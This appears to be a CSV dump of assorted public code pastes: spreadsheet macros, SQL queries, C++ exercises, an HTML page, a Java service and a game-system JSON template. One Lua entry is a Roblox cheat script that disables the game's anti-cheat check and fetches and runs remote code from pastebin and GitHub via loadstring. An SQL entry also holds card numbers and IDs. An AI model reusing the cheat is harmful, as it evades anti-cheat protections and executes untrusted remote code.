id,title,username,language,date,content
j7dXiKCq,27,ayiemedia,VBScript,Thursday 27th of July 2023 06:56:55 AM CDT,"Sub TransferData()
    Dim mainSheet As Worksheet
    Dim destSheet As Worksheet
    Dim lastRow As Long
    Dim i As Long
    
    Set mainSheet = ThisWorkbook.Worksheets(""Main"")
    
    ' Loop through each district sheet and clear its data
    For Each destSheet In ThisWorkbook.Worksheets
        If destSheet.Name <> ""Main"" And destSheet.Name <> ""Districts"" Then
            destSheet.Cells.ClearContents
        End If
    Next destSheet
    
    lastRow = mainSheet.Cells(mainSheet.Rows.Count, ""A"").End(xlUp).Row
    
    ' Loop through the rows in the main sheet and transfer data to the respective district sheets
    For i = 2 To lastRow ' Assuming your data starts from row 2, change if necessary
        Dim district As String
        district = mainSheet.Cells(i, ""E"").Value ' Assuming the district column is column ""E,"" change if necessary
        
        ' Find the respective district sheet and transfer the row data
        On Error Resume Next
        Set destSheet = ThisWorkbook.Worksheets(district)
        On Error GoTo 0
        
        ' If the district sheet is found, transfer the row data
        If Not destSheet Is Nothing Then
            lastRow = destSheet.Cells(destSheet.Rows.Count, ""A"").End(xlUp).Row
            destSheet.Rows(lastRow + 1).Value = mainSheet.Rows(i).Value
        End If
    Next i
End Sub
"
MF13tbCz,Untitled,fdevibe,YAML,Thursday 27th of July 2023 06:49:47 AM CDT,"/usr/local:
  archive.extracted:
    - source: https://foo.bar/sha256:{{ version }}
    - source_hash: sha256={{ version }}
    - archive_format: tar
    - require
      - system.dead
      	- name foobard.service
"
XLQH99Tj,query debugging cancellation,Alimin1313,PostgreSQL,Thursday 27th of July 2023 06:17:17 AM CDT,"select
	cancellation.*,
	bank.bank_name,
	bank.product_name,
	card.name_type as card_type_name,
	terminal.terminal_name,
	terminal_type.terminal_type_name,
	station.station_name,
	registration.name as nama,
	registration.nik as nik,
	cancellation.user_id as petugas
from
	trx.t_trx_subs_card_cancellation cancellation
left join master.t_mtr_bank bank on
	bank.bank_code = cancellation.card_issuer
left join master.t_mtr_station station on
	cancellation.station_code = station.station_id
left join master.t_mtr_device_terminal terminal on
	terminal.terminal_code = cancellation.terminal_code
left join master.t_mtr_device_terminal_type terminal_type on
	terminal.terminal_type = terminal_type.terminal_type_code
left join master.t_mtr_subs_card_registration registration on
	registration.uid = cancellation.uid
	and registration.card_number = cancellation.card_number
	and registration.status = 1
left join master.t_mtr_subs_card_type card on
	card.subs_card_type_id = cancellation.card_type
where
	cancellation.status = 1
	and card.subs_card_type_id = '11'
	and (DATE(cancellation.created_on) between '2023-07-23' and '2023-07-27' )
union 
                select
	cancellation.*,
	bank.bank_name,
	bank.product_name,
	card.name_type as card_type_name,
	terminal.terminal_name,
	terminal_type.terminal_type_name,
	station.station_name,
	registration.name as nama,
	registration.nik as nik,
	cancellation.user_id as petugas
from
	trx.t_trx_subs_card_cancellation cancellation
left join master.t_mtr_bank bank on
	bank.bank_code = cancellation.card_issuer
left join master.t_mtr_station station on
	cancellation.station_code = station.station_id
left join master.t_mtr_device_terminal terminal on
	terminal.terminal_code = cancellation.terminal_code
left join master.t_mtr_device_terminal_type terminal_type on
	terminal.terminal_type = terminal_type.terminal_type_code
left join master.t_mtr_family_trip_registration registration on
	registration.uid = cancellation.uid
	and registration.card_number = cancellation.card_number
	and registration.status = 1
left join master.t_mtr_subs_card_type card on
	card.subs_card_type_id = cancellation.card_type
where
	cancellation.status = 1
	and card.subs_card_type_id = '11'
	and (DATE(cancellation.created_on) between '2023-07-23' and '2023-07-27' )
	
	select * from trx.t_trx_subs_card_cancellation ttscc 
	left join master.t_mtr_family_trip_registration tmftr 
	on ttscc.card_number =tmftr.card_number  and ttscc.uid = tmftr.uid
	where ttscc.card_number ='7546800002265691' and tmftr.uid ='A717666D'
	
	
	select * from trx.t_trx_subs_card_cancellation ttscc where card_number ='7546800002265691' and uid='A717666D';
	--select * from master.t_mtr_subs_card_registration where uid='3175D415' and nik ='7546800000089580';
	select * from master.t_mtr_family_trip_registration tmftr where uid='A717666D' and card_number  ='7546800002265691'
	
	select * from master.t_mtr_family_trip_registration tmftr where uid='A717666D' and card_number  ='7546800002265691'"
ZDmzuwc2,Iterators,LEGEND2004,C++,Thursday 27th of July 2023 06:17:08 AM CDT,"#include <bits/stdc++.h>
using namespace std;

signed main()
{
    vector<int> v = {5 , 6 , 7 , 8};

    cout << *v.begin() << endl; // 5
    cout << *v.end() << endl; //random number
    cout << *(--v.end()) << endl; //8
    cout << *(v.end()--) << endl; // random number
    cout << *(v.begin()++) << endl; // 5
    cout << *(++v.begin()) << endl; // 6
    cout << *(v.begin() + 2) << endl; // number in 2-nd index
    sort(v.begin() , v.end());
    cout << *(lower_bound(v.begin() , v.end() , 7)) << endl; // 7
    cout << *(upper_bound(v.begin() , v.end() , 7)) << endl; // 8
    cout << *(upper_bound(v.begin() , v.end() , 8)) << endl; // random number

    auto it = v.begin();
    cout << *it << endl; // 5
    vector<int>::iterator pt = v.end();
    pt--;
    cout << *pt << endl; // 8
}
"
Xk6Hx78d,data646,TestGuy1,JSON,Thursday 27th of July 2023 06:13:16 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '6ff8b7697f82fd87780600578df98fb519f9bceb21fb77aa6d31d8b1b7939235089e9a563a9d01702d868b498970269b870413f7442865cc56c383c3ae810817cf4e2c3c0617b529721b111a97e86ba43dbd65ec13ac14e454f98b4a0fa34afacddcb46da1e29b5ef8d03feadb45cef5eb720c0fdcff8e2e7197278150d80f23',
  otherdata: [
    '868caec86acdac5c909d6168a492b1e4',
    'c34b7f0a3aba1302f311b898ff1ae571',
    'f4ff4b719287bdc816596399dde64899',
    '9ff30fd0b026f9abae3b3c09e8fb9d73',
    '1d8a2a68e468432bdd914ef20dce9c8f',
    'd0cd9f37ad3f052037e1f9e8d91ef871',
    'e6ed40864c8138ea164b0d555734af3d',
    '932a1f9d84837886c677ab92a82b10f4'
  ]
}"
EUsDV79p,I - Binary search - 1,LEGEND2004,C++,Thursday 27th of July 2023 05:59:07 AM CDT,"#include <bits/stdc++.h>
using namespace std;

signed main()
{
    int n , q , x;
    cin >> n >> q;
    vector<int> a(n);
    for(int i = 0; i < n; i++)
        cin >> a[i];

    sort(a.begin() , a.end()); // O(n logn)

    while(q--){
        cin >> x;
        auto e = equal_range(a.begin() , a.end() , x);
        cout << e.second - e.first << endl;
/*
        int l = lower_bound(a.begin() , a.end() , x) - a.begin();
        int r = upper_bound(a.begin() , a.end() , x) - a.begin();
        cout << (r - l) << endl;*/
    }
}
"
pvaqYEeE,webpage2,Dynamic_Fantasy,CSS,Thursday 27th of July 2023 05:50:50 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Technologies We Are Using | Antivirus Website</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #1A1A1A;
            color: #FF7597;
        }
        h1{
            color:whitesmoke
        }

        header {
            background-color: #BB86FC;    
            padding: 20px;
            text-align: center;
        }

        .technology-section {
            max-width: 800px;
            margin: 30px auto;
            padding: 30px;
        }

        .technology-title {
            font-size: 36px;
            margin-bottom: 20px;
            text-align: center;
        }

        .technology-boxes {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
        }

        .technology-box {
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
            width: 250px;
            color: #f2ebeb;
        }
        

        .technology-box img {
            max-width: 100%;
            border-radius: 5px;
            margin-bottom: 15px;
        }

        .technology-box h2 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        .technology-box p {
            font-size: 16px;
            line-height: 1.6;
        }
        .cta-button {
            background-color: #871bec;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s ease;
        }

        .cta-button:hover {
            background-color: #9603a3;
        }

        .footer {
            background-color: #2b2b2b;
            color: #fff;
            text-align: center;
            padding: 10px;
        }
    </style>
</head>
<body>
    <header>
        <h1>Antivirus Website</h1>
    </header>

    <div class=""technology-section"">
        <!-- Frontend Section -->
        <h2 class=""technology-title"">FRONTEND</h2>
        <div class=""technology-boxes"">
            <div class=""technology-box"">
                <img src=""frontend_html.gif"" alt=""HTML"">
                <h2>HTML</h2>
                <p>HTML provides the structure and content of our web pages.</p>
            </div>

            <div class=""technology-box"">
                <img src=""frontend_css.gif"" alt=""CSS"">
                <h2>CSS</h2>
                <p>CSS adds style and presentation to our web pages.</p>
            </div>

            <div class=""technology-box"">
                <img src=""frontend_js.gif"" alt=""JavaScript"">
                <h2>JavaScript</h2>
                <p>JavaScript makes our web pages interactive and dynamic.</p>
            </div>

            <div class=""technology-box"">
                <img src=""frontend_react.gif"" alt=""React"">
                <h2>React</h2>
                <p>React is used to build fast and scalable user interfaces.</p>
            </div>
        </div>

        <!-- Backend Section -->
        <h2 class=""technology-title"">BACKEND</h2>
        <div class=""technology-boxes"">
            <div class=""technology-box"">
                <img src=""backend_django.gif"" alt=""Django"">
                <h2>Django</h2>
                <p>Django is a powerful framework for building secure and maintainable backend applications.</p>
            </div>

            <div class=""technology-box"">
                <img src=""backend_js.gif"" alt=""JavaScript"">
                <h2>JavaScript</h2>
                <p>JavaScript enables server-side scripting and backend development.</p>
            </div>
        </div>

        <!-- Machine Learning Section -->
        <h2 class=""technology-title"">MACHINE LEARNING</h2>
        <div class=""technology-boxes"">
            <div class=""technology-box"">
                <img src=""ml_placeholder.gif"" alt=""Machine Learning"">
                <h2>Machine Learning</h2>
                <p>Our Machine Learning section is under development, bringing AI-powered security features.</p>
                <button class=""cta-button"">Coming Soon!</button>
            </div>

        </div>
    </div>

    <footer class=""footer"">
    </footer>
</body>
</html>
"
xyYwpFw2,problem code,ZergRushA,C++,Thursday 27th of July 2023 05:39:23 AM CDT,"#include <iostream>
#include <algorithm>
#include <string>
#include <map>
#include <random>
using namespace std;
 
std::random_device dev;
std::mt19937 rng(dev());
const std::string nulls = ""ABCDEFGHIJKLMNOPQRSTUVWXYZ"";
std::uniform_int_distribution<std::mt19937::result_type> dist_nulls(0, nulls.length()-1);
 
std::string key = ""ZEBRAS"";
std::map<int, int> key_order;
 
    void set_permutation_order(){
        for(int i = 0; i < key.length(); ++i)
            key_order[key[i]] = i;
    }
 
    void normalize(std::string& str){
        str.erase(std::remove_if(str.begin(), str.end(), ::isspace), str.end());
        std::transform(str.begin(), str.end(), str.begin(), ::toupper);
    }
 
    std::string columnar_transpos_encrypt(std::string msg){
        
        normalize(msg);
        //std::cout << msg << '\n';
        int cols = key.length();
        int rows = msg.length()/cols;
 
        if(msg.length() % cols)
            ++rows;
        
 
        char** matrix = new char*[rows];
        for(int i = 0; i < rows; ++i)
            matrix[i] = new char[cols];
        
 
        int ind{0};
        for(int row = 0; row < rows; ++row){
            for(int col = 0; col < cols; ++col){
                if(ind >= msg.length())
                    matrix[row][col] = nulls[dist_nulls(rng)];
                else
                    matrix[row][col] = msg[ind++];
            }
        }
        
        //std::cout << rows << "" "" << cols << '\n';
        std::string encrypted{};
        int col_order{};
        for(auto it = key_order.begin(); it != key_order.end(); ++it){
            col_order = it->second;
            for(int row = 0; row < rows; ++row){
                encrypted += matrix[row][col_order];
            }
        }
        
        //for debug purpose
        
        for(int row = 0; row < rows; ++row){
            for(int col = 0; col < cols; ++col){
                std::cout << matrix[row][col] << ' ';
            }
            std::cout << '\n';
        }
        
        
        for(int i = 0; i < rows; ++i)
            delete[] matrix[i];
        delete[] matrix;
 
        return encrypted;
 
    }

std::string columnar_transpos_decrypt(std::string& ciphered){
        
        int cols = key.length();
        int rows = ciphered.length()/cols;
        
        char** matrix = new char*[rows];
        for(int i = 0; i < rows; ++i)
            matrix[i] = new char[cols];
        
        std::cout << cols << "" cols "" << rows << "" rows\n"";
        
        std::string sorted_key = key;
        std::sort(sorted_key.begin(), sorted_key.end());
        //тут начинаются странности
        int ind{0};
        for(const char& ch: sorted_key){
            int col = key.find(ch);
            for(int j = 0; j < rows; ++j){
                std::cout << ciphered[ind]; //для проверки того, действительно
                                            //индекс идет по всей строке
                matrix[j][col] = ciphered[ind++];
                
            }
        }
        
        std::cout << ""\n"";
        //здесь видно, что матрица заполняется не полностью, хотя должна быть 6х5
        for(int i = 0; i < cols; ++i){
            for(int j = 0; j < rows; ++j){
                std::cout << matrix[i][j] << ' ';
            }
            std::cout << '\n';
        }
        
        
        /*
        std::string sorted_key = key;
        std::sort(sorted_key.begin(), sorted_key.end());
        
        int index{0};
        for(const auto& ch: sorted_key){
            //при заполнении проходит по sorted_key
            //и находит индекс элемента sorted_key
            //в строке key
            int right_col = key.find(ch);
            for(int row = 0; row < rows; ++row){
                matrix[row][right_col] = ciphered[++index];
            }
        }
        
        for(int col = 0; col < cols; ++col){
            for(int row = 0; row < rows; ++row){
                std::cout << matrix[row][col] << "" "";
            }
            std::cout << '\n';
        }
        
        std::string deciphered{};
        int str_len{0};
        for(int row = 0; row < rows; ++row){
            for(int col = 0; col < cols; ++col){
                deciphered += matrix[row][col];
            }
        }
        
        */
        std::string deciphered{};
        for(int i = 0; i < rows; ++i)
            delete[] matrix[i];
        delete[] matrix;
        
        return deciphered;
    }
 
int main()
{
    std::string ms = ""We are discovered flee at once"";
    set_permutation_order();
    std::string res = columnar_transpos_encrypt(ms);
    std::cout << ""Ciphered: "" << res << '\n';
    std::cout << columnar_transpos_decrypt(res);
    return 0;
}"
YbZA2baD,Sword Warriors!,LuaXe,Lua,Thursday 27th of July 2023 05:37:57 AM CDT,"if game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame:FindFirstChild(""Donate"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame.Donate:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame:FindFirstChild(""NewBundle"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame.NewBundle:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""Invite"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.Invite:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""AutoF"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.AutoF:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""SlashClick"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.SlashClick:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""PlusFrame"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.PlusFrame:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""Shift"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.Shift:Destroy() end

local mt = getrawmetatable(game) make_writeable(mt)
local nc = mt.__namecall

mt.__namecall = newcclosure(function (self, ...)
local method = getnamecallmethod()
local args = {...}

if method == ""FireServer"" and args[1] == ""HackCheck"" and tostring(self) == ""MonsterEvent"" then return end
if method == ""FireServer"" and args[1] == ""PlayServerAni"" and tostring(self) == ""MonsterEvent"" then return end

return nc(self, table.unpack(args))
end)

function C() spawn(function () while getgenv().C do
    for i, v in pairs(workspace.ForScript.Monster:GetDescendants()) do
        if v:FindFirstChild(""Monster_"") then
            for i, v in pairs(v.Monster_:GetChildren()) do
                if v then local args = {[1] = ""DamToMonster"",[2] = v,[3] = {[""damtype""] = ""normal""}}game:GetService(""ReplicatedStorage"").CurRemotes.MonsterEvent:FireServer(unpack(args)) end
            end
        end
    end wait()
        end
    end)
end

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow(""Sword Warriors!"")

local b = w:CreateFolder(""Main"")

b:Label(""God Mode is Always On"",{TextSize = 20; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

b:Toggle(""Instant Kill/Inf. Level"",function(val) getgenv().C = val C() end)

b:Label(""Made by X_LuaF#0705"",{TextSize = 21; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

local w = library:CreateWindow(""LocalPlayer"")

local b = w:CreateFolder(""LP"")

b:DestroyGui()

b:Button(""Discord"",function() setclipboard(""workink.co/2GQ/LTD"") end)
b:Button(""Full Version"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/GphZf9Xe"", true))() end)
b:Button(""Rejoin"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/mM7JBG5h"", true))() end)
b:Button(""Reset"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/EEY6SATj"", true))() end)

b:Slider(""WalkSpeed"",{min = 0; max = 100000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val end)
b:Slider(""JumpPower"",{min = 0; max = 100000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.JumpPower = val end)
b:Slider(""HipHeight"",{min = 0; max = 100000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.HipHeight = val end)
b:Slider(""Gravity"",{min = 0; max = 360; precise = false;},function(val) game.workspace.Gravity = val end)
b:Slider(""FOV"",{min = 0;max = 120;precise = false;},function(val) game.workspace.CurrentCamera.FieldOfView = val end)

function TPCFrame(Player_CFrame) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player_CFrame end end
function RTPCFrame(M_CF) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then M_CF.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame end end
function PHP(Player_HP) if game.Players.LocalPlayer.Character:FindFirstChild(""Humanoid"") then game.Players.LocalPlayer.Character.Humanoid.Health = Player_HP end end"
g0feSims,PartsServiceImpl,Nikola_944,Java,Thursday 27th of July 2023 05:18:53 AM CDT,"package softuni.exam.service.impl;

import com.google.gson.Gson;
import org.modelmapper.ModelMapper;
import org.springframework.stereotype.Service;
import softuni.exam.models.dto.PartDto;
import softuni.exam.models.entity.Part;
import softuni.exam.repository.PartsRepository;
import softuni.exam.service.PartsService;
import softuni.exam.util.ValidationUtil;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;


@Service
public class PartsServiceImpl implements PartsService {

    private static String PARTS_FILE_PATH = ""src/main/resources/files/json/parts.json"";

    private PartsRepository partsRepository;
    private ValidationUtil validationUtil;
    private ModelMapper modelMapper;
    private Gson gson;


    public PartsServiceImpl(PartsRepository partsRepository, ValidationUtil validationUtil, ModelMapper modelMapper, Gson gson) {
        this.partsRepository = partsRepository;
        this.validationUtil = validationUtil;
        this.modelMapper = modelMapper;
        this.gson = gson;
    }


    @Override
    public boolean areImported() {
        return partsRepository.count() > 0;
    }

    @Override
    public String readPartsFileContent() throws IOException {
        return Files.readString(Path.of(PARTS_FILE_PATH));
    }

    @Override
    public String importParts() throws IOException {

        String fileInput = readPartsFileContent();

        List<PartDto> partDtos = Arrays.stream(gson.fromJson(fileInput, PartDto[].class))
                .collect(Collectors.toList());

        StringBuilder sb = new StringBuilder();

        for (PartDto partDto : partDtos) {
            Optional<Part> partInDb = partsRepository.findFirstByPartName(partDto.getPartName());

            if(!validationUtil.isValid(partDto) || partInDb.isPresent()){
                sb.append(""Invalid part"").append(System.lineSeparator());
                continue;
            }

            Part part = modelMapper.map(partDto, Part.class);
            partsRepository.save(part);

            sb.append(String.format(""Successfully imported part %s - %s"",
                    part.getPartName(), part.getPrice())).append(System.lineSeparator());

        }

        return sb.toString().trim();
    }
}"
9k52wWQn,Maze Rats (Custom System Builder for FoundryVTT),demondownload,JSON,Thursday 27th of July 2023 05:18:25 AM CDT,"{""isCustomSystemExport"":true,""actors"":[{""type"":""_template"",""name"":""Player"",""data"":{""hidden"":[],""header"":{""contents"":[{""key"":""xppanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""level"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Character level"",""visibilityFormula"":"""",""label"":""Level"",""defaultValue"":""1"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""1"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""},{""key"":""xp"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Experience Points"",""visibilityFormula"":"""",""label"":""XP"",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""}],""key"":""custom_header"",""cssClass"":null,""role"":0,""permission"":0,""tooltip"":null,""visibilityFormula"":null,""flow"":null,""align"":null,""type"":""panel""},""body"":{""contents"":[{""key"":""stats"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""statsleft"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""strpanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""strlabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""m-small"",""icon"":""fas fa-dice"",""value"":""STR"",""prefix"":"""",""suffix"":"""",""rollMessage"":""${[2d6] + str}$"",""altRollMessage"":"""",""style"":""label"",""type"":""label""},{""key"":""str"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Strength"",""visibilityFormula"":"""",""label"":"""",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""},{""key"":""dexpanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""dexlabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""m-small"",""icon"":""fas fa-dice"",""value"":""DEX"",""prefix"":"""",""suffix"":"""",""rollMessage"":""${[2d6] + dex}$"",""altRollMessage"":"""",""style"":""label"",""type"":""label""},{""key"":""dex"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Dexterity"",""visibilityFormula"":"""",""label"":"""",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""},{""key"":""wilpanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""willabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""m-small"",""icon"":""fas fa-dice"",""value"":""WIL"",""prefix"":"""",""suffix"":"""",""rollMessage"":""${[2d6] + wil}$"",""altRollMessage"":"""",""style"":""label"",""type"":""label""},{""key"":""wil"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Will"",""visibilityFormula"":"""",""label"":"""",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""}],""flow"":""vertical"",""align"":""center"",""type"":""panel""},{""key"":""statsright"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""atkpanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""atklabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""m-small"",""icon"":""fas fa-dice"",""value"":""Attack"",""prefix"":"""",""suffix"":"""",""rollMessage"":""${[2d6] + attack}$"",""altRollMessage"":"""",""style"":""label"",""type"":""label""},{""key"":""attack"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":"""",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""},{""key"":""armorpanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""armorlabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""m-small"",""icon"":""fas fa-comments"",""value"":""Armor"",""prefix"":"""",""suffix"":"""",""rollMessage"":""<p><strong>Armor:</strong> ${armor}$</p>"",""altRollMessage"":"""",""style"":""label"",""type"":""label""},{""key"":""armor"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":"""",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""},{""key"":""healthpanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""healthlabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""m-small"",""icon"":""fas fa-comments"",""value"":""Health"",""prefix"":"""",""suffix"":"""",""rollMessage"":""<p><strong>Health:</strong> ${healthvalue}$ / ${healthmax}$</p>"",""altRollMessage"":"""",""style"":""label"",""type"":""label""},{""key"":""healthvalue"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Current Health"",""visibilityFormula"":"""",""label"":"""",""defaultValue"":""4"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""},{""key"":""healthmax"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Maximum Health"",""visibilityFormula"":"""",""label"":"""",""defaultValue"":""4"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""}],""flow"":""vertical"",""align"":""center"",""type"":""panel""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""},{""key"":""magicpanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""spellslabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""Spells"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""title"",""type"":""label""},{""key"":""spells"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""rowLayout"":[{""key"":""spelldescription"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.description}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""left"",""colName"":""Description""}],""head"":false,""deleteWarning"":false,""headDisplay"":true,""showDelete"":true,""nameAlign"":""left"",""nameLabel"":""Name"",""templateFilter"":[""rjtXaVTTX4zXVwoN""],""itemFilter"":[],""type"":""itemContainer""}],""flow"":""vertical"",""align"":""center"",""type"":""panel""},{""key"":""panels"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""notespanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""noteslabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""Notes"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""title"",""type"":""label""},{""key"":""notes"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":"""",""defaultValue"":"""",""size"":null,""style"":""dialog"",""type"":""textArea""}],""flow"":""vertical"",""align"":""left"",""type"":""panel""},{""key"":""gearitems"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""gearhandslabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""Hands"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""title"",""type"":""label""},{""key"":""g